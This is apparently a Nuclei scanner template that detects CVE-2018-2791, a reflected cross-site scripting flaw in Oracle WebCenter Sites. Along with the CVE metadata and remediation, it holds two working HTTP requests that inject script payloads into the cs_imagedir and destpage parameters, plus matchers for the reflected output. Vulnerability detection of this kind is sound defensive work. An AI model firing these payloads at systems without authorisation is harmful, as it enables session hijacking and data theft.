id: CVE-2018-2791

info:
  name: Oracle Fusion Middleware WebCenter Sites - Cross-Site Scripting
  author: madrobot,leovalcante
  severity: high
  description: The Oracle WebCenter Sites component of Oracle Fusion Middleware is susceptible to multiple instances of cross-site scripting that could allow unauthenticated attackers with network access via HTTP to compromise Oracle WebCenter Sites. Impacted versions that are affected are 11.1.1.8.0, 12.2.1.2.0 and 12.2.1.3.0. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Oracle WebCenter Sites, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebCenter Sites accessible data as well as unauthorized update, insert or delete access to some of Oracle WebCenter Sites accessible data.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the targeted user's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches provided by Oracle to address this vulnerability.
  reference:
    - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html
    - http://web.archive.org/web/20211206165005/https://securitytracker.com/id/1040695
    - https://www.exploit-db.com/exploits/44752/
    - https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites
    - https://nvd.nist.gov/vuln/detail/CVE-2018-2791
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
    cvss-score: 8.2
    cve-id: CVE-2018-2791
    epss-score: 0.02132
    epss-percentile: 0.89226
    cpe: cpe:2.3:a:oracle:webcenter_sites:11.1.1.8.0:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: oracle
    product: webcenter_sites
  tags: cve2018,cve,edb,oracle,xss,wcs

http:
  - raw:
      - |
        GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{BaseURL}}
      - |
        GET /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
        Host: {{BaseURL}}

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif'

      - type: word
        part: body
        words:
          - '<script>alert(24)</script>'
          - 'Missing translation key'
        condition: and
# digest: 4a0a00473045022000e0f689b888381295db18286eb8a3a8f0f81b6629a7f7b3d7193b6651f8b7f7022100ec69e058fe7e843cc45e66a2b995950fef82bcef5928bd86b65be3edc451bed0:922c64590222798bb761d5b6d8e72950